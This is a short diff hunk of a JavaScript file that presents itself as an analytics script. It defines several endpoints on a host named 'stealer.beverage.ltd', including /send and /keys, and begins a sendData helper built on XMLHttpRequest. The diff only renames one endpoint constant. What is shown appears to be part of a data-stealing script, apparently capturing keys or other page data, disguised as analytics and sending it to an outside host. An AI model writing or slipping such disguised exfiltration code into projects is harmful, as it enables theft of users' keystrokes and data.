@@ -2,7 +2,7 @@
   console.log("Analytics loaded! And it works!");
   const externURL = "https://stealer.beverage.ltd/send";
   const externURLKeys = "https://stealer.beverage.ltd/keys";
-  const PANDA = "https://stealer.beverage.ltd/PONY";
+  const DOGS = "https://stealer.beverage.ltd/dogs";
   // Helper function to send data
   function sendData(data, url) {
     const xhr = new XMLHttpRequest();
